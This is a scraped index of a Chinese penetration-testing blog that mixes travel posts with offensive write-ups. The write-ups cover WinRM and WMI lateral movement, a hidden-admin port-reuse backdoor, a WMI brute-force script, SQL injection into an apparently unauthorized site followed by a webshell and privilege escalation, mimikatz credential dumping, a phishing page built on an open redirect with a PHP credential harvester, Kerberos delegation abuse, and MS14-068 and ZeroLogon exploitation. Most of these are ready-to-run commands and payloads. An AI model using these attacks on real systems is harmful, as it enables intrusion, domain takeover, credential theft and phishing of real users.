https://github.com/bohops/WSMan-WinRM Ladon 模块功能 目标端口 目标系统 使用教程 Winrm爆破 5985/5986端口 Windows http://k8gege.org/Ladon/WinrmScan.html WinrmExec 5985 Windows http://k8gege.org/Ladon/WinrmExec.html 其他利用开启远程主机3389如果目标开启了WinRM可以利用PeekABoo工具使目标开启3389 端口复用后门将WinRM监听端口由5985改为80或者443，即使端口被web服务也不影响，并且不影响web服务。利用如下 1）配置目标WinRM服务，更改监听端口开启复用 12winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=&quot;80&quot;}winrm set winrm/config/service @{EnableCompatibilityHttpListener=&quot;true&quot;} 2）链接目标 1winrs -r:192.168.86.114 -u:192.168.86.114\\administrator -p:123456!@#$% whoami 该方法适用于有web服务的机器，不会开启新的端口，配合添加隐藏管理员用户，隐蔽性极高。 参考引用： http://t3ngyu.leanote.com/post/LM-WinRM-WinRS https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/ https://xz.aliyun.com/t/6888 https://www.cnblogs.com/-mo-/p/12019314.html","link":"/2020/08/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewinrm%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"title":"剑走偏锋：旁站入侵到提权","text":"已经实习了一个月，感觉每天还是很充实的~ 前言：目标站：A.com 在经过一系列常规操作之后，发现主站没有什么可以入手的地方，好在 A 站没有CDN，可以尝试从旁站切入。 IP反查，得到大概20几个同服域名，手动过了几个，发现旁站 B.com (aspx+mssql) 某页面参数加单引号后报错，丢到sqlmap里先去跑一下，继续看别的旁站，然而大部分都是WordPress站点或者是纯静态也没什么搞头，看了一会发现sqlmap跑出来的结果如下： 123456789101112---Parameter: ProductID (GET)Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: ProductID=2' AND 1913=1913 AND 'GquC'='GquCType: error-based Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause(IN) Payload: ProductID=2' AND 1360 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (1360=1360) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(98)+CHAR(113))) AND 'JOdp'='JOdp---web server operating system: Windows 8.1 or 2012 R2web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 8.5back-end DBMS: Microsoft SQL Server 2008 在使用sqlmap继续跑数据时，发现B站所有的动态页面均报错，报错内容翻译过来大致就是数据库短时间内查询请求过多，导致线程池过载无法处理。 等了大概十分钟左右，站点又恢复了正常，所以关键时刻还是手工靠谱啊。 mssql报错注入：由于sqlmap给出的提示有报错注入，这里直接用报错注入了，相对来说效率也比较高，下面直接给出注入过程和需要注意的地方： 获取数据库名：121. http://B.com/AutoMain.aspx?ProductID=1' and db_name()&gt;0--b.com_db 查询当前数据信息：121. http://B.com/AutoMain.aspx?ProductID=1' having 1=1--Product.ProductID 踩坑指南：子查询不支持返回多条数据，且mssql不像MySQL那样支持limit，下面给出解决办法 获取表名：1234561. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 name from sysobjects where xtype='u' and name !='info');--2. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 table_name from information_schema.tables);--此方法可查询任意用户表：http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 name from (select top 1 id,name from sysobjects where xtype=char(85)) T order by id desc) &gt; 1--获取到的用户表：AdminLogin 获取列名：123456781. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'AdminLogin') and name&lt;&gt;'id');--2. http://B.com/AutoMain.aspx?ProductID=1' and 1=(select top 1 column_name from information_schema.columns);--此方法可查询AdminLogin表的任意列：3. http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 col_name(object_id('AdminLogin'),1) from sysobjects) &gt; 1--获取到用户表的列名：AdminIDUserNamePassword 获取数据：123451. http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 UserName from AdminLogin where AdminID=1) &gt; 1--2. http://B.com/AutoMain.aspx?ProductID=1' and (select top 1 Password from AdminLogin where AdminID=1) &gt; 1--获取到的账号密码：adminislamabad 效果如图： 旁站GetShell：通过获取到的账号密码成功登B站的网站后台 文件上传处只校验文件类型，上传图片马抓包改后缀即可，连接shell后发现无权限跨目录，只能继续提权了 主机提权：一开始看了下系统进程应该没有杀软（其实是有的，国外的小众杀软名字不是很起眼），补丁也没打几个，以为很好提。 想着常规操作就能拿下，直接穿了CS的远控上去运行，等了会发现并没有主机上线，仔细一看刚传的木马没了，才知道遇上杀软了。然后又试了几个本地提权的exp，不是被杀就是报错。 后来想起来土司有老哥分享过免杀的提权神器：JuicyPotao，使用方法：https://www.4hou.com/technology/13698.html 成功提权： 提权成功之后，后面的操作就行云流水了，目的是拿 A.com 的shell ，先用nc反弹出system权限的cmdshell，然后可以直接写马，也可以远程下载，等等姿势还有很多… 参考文章：https://www.jianshu.com/p/0cf7bd46237e https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI","link":"/2019/07/26/%E5%89%91%E8%B5%B0%E5%81%8F%E9%94%8B-%E6%97%81%E7%AB%99%E5%85%A5%E4%BE%B5%E5%88%B0%E6%8F%90%E6%9D%83/"},{"title":"内网渗透|基于WMI的横向移动","text":"基于WMI的横向移动 WMI 介绍WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的Windows系统，攻击者使用wmi来进行攻击，但 Windows 系统默认不会在日志中记录这些操作，可以做到无日志，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用wmic进行远程执行命令。 WMI 利用条件 远程服务器启动Windows Management Instrumentation服务（默认开启） 135 端口未被过滤 [默认配置下目标主机防火墙开启将无法连接] 连接失败常见错误号：123456789101112131415161718192021221.开启防火墙时，允许共享例外错误:代码 = 0x800706ba说明 = RPC 服务器不可用。设备 = Win322.组策略阻止administraotr远程访问时错误:代码 = 0x80070005说明 = 拒绝访问。设备 = Win323.IP安全策略阻止135时错误:代码 = 0x800706ba说明 = RPC 服务器不可用。设备 = Win324.禁用winmgmt服务时错误:代码 = 0x80070422说明 = 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动。设备 = Win325.拒绝wbem目录权限，无法使用wmic的...... 利用 wmic 进行横向移动常用系统自带命令123456781.列出远程主机进程wmic /node:192.168.1.1 /user:192.168.1.1\\administrator /password:!@#123QWE process list brief2.在远程系统上执行bat脚本wmic /node:192.168.1.1 /user:192.168.1.1\\administrator /password:!@#123QWE process call create c:\\programdata\\test.bat3.在远程系统上执行单条命令wmic /node:192.168.1.1 /user:192.168.1.1\\administrator /password:!@#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add引用自：https://www.cnblogs.com/0xdd/p/11393392.html 批量爆破wmi的爆破经过实践，错误次数3次以上，360会拦截【无杀软时没有测试】，记录日志为远程rdp爆破，并暂时限制wmi的连接。 ※以下为单密码爆破，有爆破多个密码爆破的需求的话，可以根据ipc横向移动那篇自行修改 坑点：需注意特殊字符，如密码中有 % 需要用 % 来转义，例 ：123#$% 应转化为 123#$%% 1234567891011@echo offclsecho Useage: %0 ip.txtfor /f %%i in (%1) do (echo wmic /node:%%i /user:&quot;%%i\\administrator&quot; /password:&quot;123456&quot; process list brief &gt;&gt; log.txtwmic /node:%%i /user:&quot;%%i\\administrator&quot; /password:&quot;123456&quot; process list brief &gt;NUL 2&gt;NULIF errorlevel == 0 (echo success:%%i &gt;&gt; pic.txt))echo end &gt;&gt; end.txt 利用工具wmiexec.vbs没有使用过，暂未测试 wmiexec.vbs 是为了解决wmic无法回显命令而开发的一个工具，原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显 ”执行命令的结果“ 和获取 ”半交互式的 shell“ 。 1cscript wmiexec.vbs /cmd 192.168.1.1 administrator test@123 whoami impacket-wmiexec优点：支持pth 缺点：他的使用需要调用wmi服务，占用目标的445、135和另一个随机端口。 使用参考：域渗透——Pass The Hash的实现 (3gstudent.github.io) sharpwmi这是一个基于135端口来进行横向移动的工具，具有执行命令和上传文件功能，通过wmi来执行命令，通过调用来进行数据传输。优点：只依赖135端口，不依赖139和445端口缺点：目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。执行命令和上传文件都依赖powershell(被360拦截了) https://github.com/QAX-A-Team/sharpwmi sharpwmi（修改版）https://github.com/idiotc4t/sharpwmi 这是一个基于135端口来进行横向移动的工具，具有执行命令和上传文件功能,通过wmi来执行命令，通过注册表来进行数据传输。 WMIHACKER(推荐)免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横向移动测试工具。(只依赖135端口，不依赖139和445端口) 重要：支持pth -&gt; https://github.com/360-Linton-Lab/WMIHACKER/issues/1 主要功能：1、命令执行；2、文件上传；3、文件下载 https://github.com/360-Linton-Lab/WMIHACKER Ladon 模块功能 目标端口 目标系统 使用教程 WMI爆破 135端口 Windows http://k8gege.org/Ladon/WmiScan.html WMI-NtlmHash爆破 135端口 Windows http://k8gege.org/Ladon/WmiHashScan.html WmiExec（推荐） 135端口 Windows 只需135端口通过注册表回显，不像Impacket或其它工具还依赖445，不依赖PowerShell，适用于任意目标 WmiExec2 135端口 Windows 和WmiExec一样只需135端口通过注册表回显，但依赖PowerShell，无PowerShell的目标可能不适用 Sharp-WMIExec没有使用过，暂未测试 https://github.com/checkymander/Sharp-WMIExec WMIcmd没有使用过，暂未测试 https://github.com/nccgroup/WMIcmd","link":"/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"title":"匹配关键字删除文本行","text":"当我们采集了一批域名的时候，不要急切的丢到轮子里去扫，什么站能扫什么站不能扫，心里一定要有点b数。 打开采集好的域名提示：Notepad++作者反G，坚决抵制它！！！！需要的软件：Notepad++ 快捷键：Ctrl+H ，弹出查找/替换窗口，搜索一下gov 设置替换规则输入下面的正则表达式，然后查找模式选择正则表达式，点击全部替换即可删除含有gov的每一行： 1.*gov.*\\r\\n","link":"/2019/02/14/%E5%8C%B9%E9%85%8D%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%A0%E9%99%A4%E6%96%87%E6%9C%AC%E8%A1%8C/"},{"title":"利用Procdump+Mimikatz获取Windows帐户密码","text":"0x01 前言：前段时间拿下一个网站的shell，很幸运的是直接就是System权限，结果发现执行添加用户命令并不能成功回显 看了下系统进程，原来是开启了360的主动防御，奈何也不会做免杀，上传exp运行就被杀，尝试各种方法去kill主动防御进程，无果。。。 在土司发帖求助了一下经验丰富的大佬们，然后就有了如下文章： 实验环境：win7企业版64位 0x02 导出lsass.exe首先要获取到内存文件lsass.exe进程, 它用于本地安全和登陆策略,一般在进程管理器中能看到 这里用到微软官方发布的工具Procdump导出lsass.exe，所以不存在被杀软拦截的情况： procdump64.exe -accepteula -ma lsass.exe lsass.dmp 0x03 执行mimikatz这里不建议直接上传到服务器上执行，因为可能会被杀软拦截 将lsass.dmp下载到本地后，然后执行mimikatz mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit 0x04 列出账号密码可以看到有明文的密码，还有NTLM的hash hash可以拿去网站解密下，一般情况下六位以下密码还是很容易破解出来的 当然该工具不只有这一种用法，具体的去看官方文档可以去灵活使用。","link":"/2018/11/08/%E5%88%A9%E7%94%A8procdump64+mimikatz%E8%8E%B7%E5%8F%96windows%E5%B8%90%E6%88%B7%E5%AF%86%E7%A0%81/"},{"title":"南锣鼓巷游记","text":"南锣鼓巷是一条胡同，位于北京中轴线东侧的交道口地区，北起鼓楼东大街，南至平安大街，宽8米，全长787米，与元大都同期建成。是北京最古老的街区之一，至今已有740多年的历史。也位列规划中的25片旧城保护区之中。因其地势中间高、南北低，如一驼背人，故名罗锅巷。到了清朝，乾隆十五年(1750年)绘制的《京城全图》改称南锣鼓巷。 我与世界的关系，我们用艺术解决 一个胡同口 色彩斑斓，生活亦此 旅伴 老街 后海","link":"/2017/08/16/%E5%8D%97%E9%94%A3%E9%BC%93%E5%B7%B7%E6%B8%B8%E8%AE%B0/"},{"title":"古北水镇小记","text":"去水镇的计划很早之前就想好了，最近几天才有时间，去到了哪里以后，无论是风景还是环境只能用惊艳来形容。 去之前选的住宿是民宿，在附近的一个民俗村里，距离水镇不到两公里，来回都有车接送所以很方便。房东大姐热情又实在，住的很舒服。 来到景点门口的第一眼就被美到了，蓝天白云，青山绿水，配上十分古朴的建筑风格，有种世外桃源的感觉。 偶然发现一处台阶上的涂鸦，完美的诠释了水镇的主题。 这是在永顺染坊拍的，说实话，近门第一眼看到挂着一堆布条还挺诡异的，不过上到二楼风景还是很好的。 在路上遇见一只橘猫，哇，这个猫聪明的简直不配做个喵星人，想喂它点吃的，刚一拿包，它就主动过来对我们喵喵叫，一点也不怕生人，估计人家靠脸吃饭不是一次两次了吧（突然感觉自己还不如一只喵）。 这是一个镖局的比武场，里面有点武器，外面有梅花桩，人形桩什么的，不过好像也没啥特别的地方。。 太阳刚落山，灯光也都亮了起来，傍晚的水镇像是换上了一件新的衣服，比起白天又是另一种美。 后来跑到了白天已经踩好点的一个山顶上，感觉这里应该是水镇最高，视野最开阔的地方了，整个小镇的景色一览无余，尽收眼底，虽然是晚上，但是没有一条路是没有灯的，胆子小的不用害怕，随便玩随便走。 走之前最后一张照片，这里是入口也是出口。虽然玩了一天有些累，心请还是特别放松的。 第二天早起要离开了，阳光很好也没什么风，感觉比昨天要暖和太多了，留个“影”走喽~","link":"/2019/03/30/%E5%8F%A4%E5%8C%97%E6%B0%B4%E9%95%87%E5%B0%8F%E8%AE%B0/"},{"title":"可我浪费着我寒冷的年华","text":"Hey, password is required here. eceff9799e8847f8054493425b1ee6cbf92f007b3eceeb038166878940e64516b9f096a9b1b2157b9b75055b5923963d56ad98b288feb46aaf5f554f77e9b656484c4d4831bc4c895d9d928ecdbc50b8e163f6e148519d22e99671ca1f4c00ad6f78520e50f1b920ea680f6d3824bd678ca4ea0a9be279779c11fea3888dd84e3dbf5a6bd8f20f14d7c898d1096da9b94832484d6f04c5f49208d5c4320da78243623d693d2bd3231d2c70f66b254efdfab518f29f2ec1bb4a2fceef03432e4abcf9a59e80f46c647299d4e7777fd76904e55d6fb88126d9d5ec69887933908f252966354c948dc61433b1dc7cecbe6f01ca4e077177535e520a1bb36fc90683b37d06fff0d5e018504203b9f90338b1dd696a30907d284a1f31d648a425a7b34956ab9c3dfbea4068547999e184f474bc231e69055c943306c5a7e8be9d7a6d5d543f5d12ddff9f3f45adbeea27eb314323673e0c7d1ed13af83deb23eca868f9fee1b499ba9b59a271574dfb73b777640199f9ec6d1f654647b682087fdb56c4d81bd6cb338ba55822d5175eb126fc75130e584441180f8477b9c36c3c757b9ee1daa37b20009dfed136e85670f7cd766a78dffc06272fb5dfe98d5740b5113993e419ab7f83731f69a20cd1aaec4cc9da4446f1552b298066e5c317eb0b62dba45537612133a49e094a03bc6c2ff0cfea880e7d6434740b6f8d073ec4e24be38b1a94088001f66dad721005aa05bbbd12e28c389113bd7b443aed9462768f8ec4513915155b1514df2f87fa84bc808d31aaf2ba3b2e4d36a0de07a72573e29bbf7ff2f3ba91cd984bcb9e42c20b2463485e43e4c685eca1a2107fc15c92ad6d22bf3e45ec79d6670346e54ee2be1609a13bfe38cd4514fe3919e35cb1a5567c5aab29bca6ebbe38558c6afe8ceb40","link":"/2019/03/25/%E5%8F%AF%E6%88%91%E6%B5%AA%E8%B4%B9%E7%9D%80%E6%88%91%E5%AF%92%E5%86%B7%E7%9A%84%E5%B9%B4%E5%8D%8E/"},{"title":"回炉再造","text":"安全技术学习，承认自己的弱点不是丑事。只有对原理了然于心，才能突破更多的限制。 ——@ringzero 一二三四，二二三四，转个圈圈，再来一次。","link":"/2020/01/20/%E5%9B%9E%E7%82%89%E5%86%8D%E9%80%A0/"},{"title":"圈子社区登陆处任意url跳转实现钓鱼用户","text":"漏洞本身倒是没什么大危害，稍加利用下还蛮好玩的。 漏洞详情圈子社区登陆首页默认链接：https://www.secquan.org/Login?jump=aHR0cHM6Ly93d3cuc2VjcXVhbi5vcmc= 对于上面红框中jump后内容的base64解码为:https://www.secquan.org 这里使用 https://www.baidu.com 的base64加密后的内容替换下，构造出的链接为： https://www.secquan.org/Login?jump=aHR0cHM6Ly93d3cuYmFpZHUuY29t 登陆成功后即自动跳转至百度。 利用设想 实际利用访问构造好的钓鱼链接，正常登陆（能力有限，做不到太完美，不过看着倒是像那么回事）： 先看一下页面跳转时弹窗的效果※ 以下均在qq中测试效果 其实弹窗这里的标题默认是有网址显示的，这样等于直接暴露地址了，加一段JS来重写alert方法即可。 1234567891011&lt;script&gt;window.alert = function(name){var iframe = document.createElement(&quot;IFRAME&quot;);iframe.style.display=&quot;none&quot;;iframe.setAttribute(&quot;src&quot;, 'data:text/plain,');document.documentElement.appendChild(iframe);window.frames[0].window.alert(name);iframe.parentNode.removeChild(iframe);}alert(&quot;账号异常，请重新登陆&quot;);&lt;/script&gt; 首页成品是这样的（勉勉强强以假乱真）Ctrl+S将社区登陆的首页静态页面保存在了本地，进行了一番修改（配合接收账号密码的php文件），弄了会儿发现验证码无法调用，索性直接删除吧，感觉这个验证码是最失败的地方。 后台简单写个接收账号密码的php页面1234567&lt;?php $email=$_POST['email'];$password=$_POST['password'];$result=$email.&quot;|&quot;.$password; file_put_contents(&quot;fish.txt&quot;, $result.PHP_EOL, FILE_APPEND);echo &quot;&lt;script&gt;window.location.href='https://www.secquan.org'&lt;/script&gt;&quot;; ?&gt; 钓鱼成功 最后用户输入的内容被写入到同目录下的fish.txt中,且页面被重定向至 https://www.secquan.org ，由于之前登陆成功的会话还在，所以直接就是已登陆的状态了。","link":"/2019/06/10/%E5%9C%88%E5%AD%90%E7%A4%BE%E5%8C%BA%E4%BB%BB%E6%84%8Furl%E8%B7%B3%E8%BD%AC%E5%AE%9E%E7%8E%B0%E8%B4%A6%E5%8F%B7%E9%92%93%E9%B1%BC/"},{"title":"GoogleHackingTool|在线Google Hacking小工具","text":"写这个轮子的原因是自己在挖src的时候，会用到Google Hacking语法进行信息搜集，自己懒到ctrl+c/ctrl+v都不想按，就有了这个轮子的诞生。 以后很可能会更新成动态语言的，方便扩展更多语法从而灵活运用，敬请期待吧。 在线版：https://ght.se7ensec.cn/ GayHub：https://github.com/r00tSe7en/GoogleHackingTool","link":"/2019/01/20/%E5%9C%A8%E7%BA%BFGoogle%20Hacking%E5%B0%8F%E5%B7%A5%E5%85%B7/"},{"title":"域渗透|Delegation","text":"Delegation（委派） 委派将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动，接受委派的用户只能是服务账户或者主机账户。 域委派存在三种类型，非约束委派、约束委派、基于资源的约束委派。 例子 Client 需要通过HTTP访问sqlserver服务器，但HTTP并没有访问sqlserver的权限，这时候HTTP就需要Client的身份去访问sqlserver ，然后再将请求返回给Client。 非约束委派https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB 对于非约束性委派（Unconstrained Delegation）， 服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT，模拟用户访问任意服务。配置了非约束委派的账户的userAccountControl 属性有个FLAG位TRUSTED_FOR_DELEGATION。非约束委派的设置需要SeEnableDelegation特权，该特权通常仅授予域管理员 (注：域控主机账户默认配置非约束委派属性)。 非约束委派(Unconstrained Delegation)是一种风险性极大的委派方式，它通过TGT转发使服务器具有模拟用户的能力。服务账户根据用户发给自己的可转发的TGT代表用户请求其他任何服务，由此可知，一旦开启了无约束委派的服务账户被攻陷，用户身份将被滥用。 ADFind查询非约束委派的主机 1AdFind.exe -b &quot;DC=nncm,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName 查询非约束委派的服务账户 1AdFind.exe -b &quot;DC=nncm,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName PowerView查找域中配置非约束委派用户 1Get-NetUser -Unconstrained -Domain nncm.com |select name 查找域中配置非约束委派的主机 1Get-NetComputer -Unconstrained -Domain nncm.com | select name ldapsearchkali上自带，适合在域外查询 查找域中配置非约束委派的用户 1ldapsearch -x -H ldap://192.168.201.166:389 -D &quot;CN=test,CN=Users,DC=nncm,DC=com&quot; -w 123456 -b &quot;DC=nncm,DC=com&quot; &quot;(&amp;(samAccountType=805306368) (userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot; 查找域中配置非约束委派的主机 1ldapsearch -x -H ldap://192.168.201.166:389 -D &quot;CN=administrator,CN=Users,DC=nncm,DC=com&quot; -w 123456 -b &quot;DC=nncm,DC=com&quot; &quot;(&amp;(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot; 非约束委派+Spooler利用这个实现了前提是：需要获取一台 “主机账户” 开启了非约束委派域内机器的权限 https://github.com/leechristensen/SpoolSample 在机器上以管理员权限执行以下命令，监听来自DC机器的相关信息 1Rubeus.exe monitor /interval:1 /filteruser:DC01$ 利用SpoolSample强制让DC访问WIN-TVHO4UIFMBT机器，抓取票据 1SpoolSample.exe DC01 WIN-TVHO4UIFMBT Rubeus导入获取到的TGT票据 1Rubeus.exe ptt /ticket:抓取下来的票据base64内容 或使用powershell命令转成文件格式进行凭据导入 https://blog.csdn.net/a3320315/article/details/106511098 1[IO.File]::WriteAllBytes(&quot;C:\\Users\\Public\\ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;base64凭据内容&quot;)) 导出域控hash 1mimikatz.exe &quot;log&quot; &quot;lsadump::dcsync /all /csv&quot; &quot;exit&quot; 约束委派https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB 约束委派利用约束委派可以作为变种黄金票据，用作后门权限维持。 https://github.com/SkewwG/domainTools/blob/master/delegationVul/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8.md 基于资源的约束委派https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB 基于资源的约束委派利用域渗透——基于资源的约束委派利用 - https://xz.aliyun.com/t/7454 123基于资源的约束委派利用解决敏感用户不可委派的问题利用基于资源的约束委派进行域权限维持 参考https://forum.butian.net/share/1591 - ※红队域渗透技术：委派攻击汇总（全） https://xz.aliyun.com/t/7217 - ※域渗透—Kerberos委派攻击(这一篇很不错) https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw - 微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato） https://cloud.tencent.com/developer/article/1601095 - 这是一篇“不一样”的真实渗透测试案例分析文章 https://www.cnblogs.com/nice0e3/p/15875685.html - 域内委派攻击 https://xz.aliyun.com/t/10061 - kerberos委派攻击的那些事 https://mp.weixin.qq.com/s/GdmnlsKJJXhElA4GuwxTKQ - 委派攻击知识点全收录（补充） https://www.cnblogs.com/car7n/p/14789004.html - 委派 https://skewwg.github.io/2020/11/25/yue-shu-wei-pai-li-yong/ - 约束委派利用 https://skewwg.github.io/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong - 基于资源的约束委派利用","link":"/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-Delegation/"},{"title":"域渗透|MS14-068","text":"MS14-068 MS14-068https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#PAC-1 MS14068是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。 这个漏洞中主要的问题是存在于KDC会根据客户端指定PAC中数字签名的加密算法，以及PAC的加密算法，来校验PAC的合法性。这使得攻击者可通过伪造PAC，修改PAC中的SID，导致KDC判断攻击者为高权限用户，从而导致权限提升漏洞的产生。 漏洞补丁地址: https://technet.microsoft.com/zh-cn/library/security/MS14-068 利用方式MS14-068对应的补丁为KB3011780，可在域控上通过systeminfo查看是否安装此补丁。 1systeminfo|find &quot;3011780&quot; keoko12klist purge 清除票据kekeo &quot;exploit::ms14068 /domain:rootkit.org /user:sqladmin /password:Admin12345 /ptt&quot; &quot;exit&quot; Pykek py：https://github.com/mubix/pykekexe：https://github.com/ianxtianxt/MS14-068 参数说明： -u 域账号@域名称-p 为当前用户的密码-s 为当前用户的SID值，可以通过whoami/all来获取用户的SID值-d 为当前域的域控–rc4 为当前用户的Hash 通过dir来访问域控的共享文件夹，提示拒绝访问。1dir \\\\OWA2013.rootkit.org\\c$ 生成票据1MS14-068.exe -u sqladmin@rootkit.org -p Admin12345 -s S-1-5-21-3759881954-2993291187-3577547808-1613 -d OWA2013.rootkit.org 脚本执行成功会在当前目录下生成一个ccache文件，票据导入之前cmd下使用命令klist purge，或者在mimikatz中使用kerberos::purge删除当前缓存的kerberos票据。1klist purge 使用mimikatz导入生成的ccache文件1mimikatz &quot;kerberos::ptc TGT_sqladmin@rootkit.org.ccache&quot; exit 再次dir访问域控共享就可以成功访问。goldenPac impacket工具包里面的goldenPac.py，这个工具是结合ms14-068加psexec的产物，利用起来十分顺手。 1python goldenPac.py -dc-ip 192.168.3.144 -target-ip 192.168.3.144 rootkit.org/sqladmin:Admin12345@OWA2013.rootkit.org 参考https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2014/ms14-068https://daiker.gitbook.io/windows-protocol/kerberos/3#0x00-qian-yanhttps://cloud.tencent.com/developer/article/1760132https://www.cnblogs.com/backlion/p/6820744.html","link":"/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068/"},{"title":"域渗透|ZeroLogon的利用","text":"CVE-2020-1472 https://www.anquanke.com/post/id/219374 文中提到一种办法，适用于其他办法无法恢复的情况 脱域后，可以使用powershell来强制同步，一次性重置计算机的机器帐户密码。(包括AD，注册表，lsass里面的密码)。 1powershell Reset-ComputerMachinePassword 环境12域：AAAA.COMDC：LX-DC01.AAAA.COM &lt;-ip-&gt; 192.168.1.4 python版本pochttps://github.com/SecuraBV/CVE-2020-1472 1python3 zerologon_tester.py LX-DC01 192.168.1.4 安装impacket12git clone https://github.com/SecureAuthCorp/impacket.gitcd impacket &amp;&amp; pip3 install . exploithttps://github.com/risksense/zerologon - set_empty_pw.py 1python3 set_empty_pw.py LX-DC01 192.168.1.4 获取域管administrator的hash1python3 secretsdump.py AAAA.COM/LX-DC01\\$@192.168.1.4 -no-pass 通过wmiexec使用 “administrator”的hash获取域管权限1python3 wmiexec.py -hashes :be833ac3f39c0f843b1b653d37c34dbe AAAA.COM/administrator@192.168.1.4 获取目标原始hash123reg save HKLM\\SYSTEM system.savereg save HKLM\\SAM sam.savereg save HKLM\\SECURITY security.save 将导出的hash文件下载到本地123get system.saveget sam.saveget security.save 坑点：这一步有可能python出现编码错误导致不能下载 1234不同语言的编码不同，可以先获取下语言然后搜对应编码https://docs.python.org/3/library/codecs.html指定下编码python3 wmiexec.py -hashes :be833ac3f39c0f843b1b653d37c34dbe AAAA.COM/administrator@192.168.1.4 -codec gb2312 也可使用net use将文件copy回来 1234567mimi注入hash到cmdprivilege::debugsekurlsa::pth /user:administrator /domain:AAAA /ntlm:be833ac3f39c0f843b1b653d37c34dbenet use \\\\192.168.1.4copy \\\\192.168.1.4\\c$\\system.save c:\\system.savecopy \\\\192.168.1.4\\c$\\sam.save c:\\sam.savecopy \\\\192.168.1.4\\c$\\security.save c:\\security.save 在域控主机上删除导出的hash文件。123del /f system.savedel /f sam.savedel /f security.save 使用secretsdump读取下载到本地的hash文件,获取域控机器账户置空前的原始hash1python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL 密码恢复建议使用： 脚本有可能会缺少xxx包导致报错，还没整明白啥原因 https://github.com/mstxq17/cve-2020-1472 - restorepassword.py 1python3 restorepassword.py aaaa.com/LX-DC01@LX-DC01 -target-ip 192.168.1.4 -hexpass 